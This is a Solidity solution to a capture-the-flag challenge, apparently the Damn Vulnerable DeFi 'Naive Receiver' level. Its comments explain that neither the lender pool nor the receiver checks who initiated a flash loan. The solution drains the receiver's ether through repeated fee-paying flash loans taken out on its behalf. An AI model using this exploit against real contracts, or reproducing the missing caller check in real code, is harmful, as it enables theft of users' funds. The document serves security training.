// SPDX-License-Identifier: MIT
pragma solidity =0.8.24;

// The player may not have access to the contracts, so the player
// should use these interfaces.
import { IFlashLoanReceiver } from "./Interfaces/IFlashLoanReceiver.i.sol";
import { INaiveReceiverLenderPool } from "./Interfaces/INaiveReceiverLenderPool.i.sol";

// You start with a pool and receiver interface provided to you.
// All the setup has been done for you. You simply need to make sure the
// challenge is solved with the Foundry test running the solveChallenge()
// function.
contract IAmASharkSwimmingInThePool {
    INaiveReceiverLenderPool private pool;
    IFlashLoanReceiver private receiver;

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _receiver) payable {
        pool = INaiveReceiverLenderPool(payable(_pool));
        receiver = IFlashLoanReceiver(payable(_receiver));
    }

    // For the Foundry test to see if you've solved the challenge, your
    // contract is instantiated and then this function is run.
    function solveChallenge() public {
        /*//////////////////////////////////////////////////////////////
                                    SOLUTION
        //////////////////////////////////////////////////////////////*/

        // The NaiveReceiverLenderPool function flashLoan() does not implement
        // any checking to ensure the receiver matches the msg.sender or that
        // the receiver really has intentionally initiated the flash loan.
        // Similarly, the FlashLoanReceiver onFlashLoan() function does not
        // check (or even save to a variable) to first address parameter
        // (the receiver address) provided by the NaiveReceiverLenderPool.

        // Due to these failures by both parties to validate who initiated the
        // flash loan, any third party can initiate a flash loan on behalf of
        // the FlashLoanReceiver, causing it to take out a flash loan and
        // repay the loan with the fee. This means we can drain the FlashLoanReceiver
        // contract by having it empty its money to the NaiveReceiverLenderPool
        // via fees. We simply need to initiate many flash loans on behalf of
        // the FlashLoanReceiver.

        // Since the FlashLoanReceiver has 10 ether, the lender fee is 1 ether,
        // and we (the attacker) are paying for the gas, we can simply create
        // 10 flash loans to completely drain the FlashLoanReceiver contract.

        for (uint256 i; i < 10; ++i) {
            pool.flashLoan(address(receiver), ETH, 1, "");
        }
        // The amount doesn't matter, as long as it's not zero and is less than
        // or equal to the maxFlashLoan() amount for the "ETH" token.
        // Similarly, the calldata is never used, so we leave it blank with ""

        // Youtube tutorial:
        // https://www.youtube.com/watch?v=2tFlcH5k-jk
    }

    // The "payable" functionality and receive/fallback are provided for your
    // convenience. You are not required to use them and may remove them if you
    // want.
    receive() external payable { }
    fallback() external payable { }
}
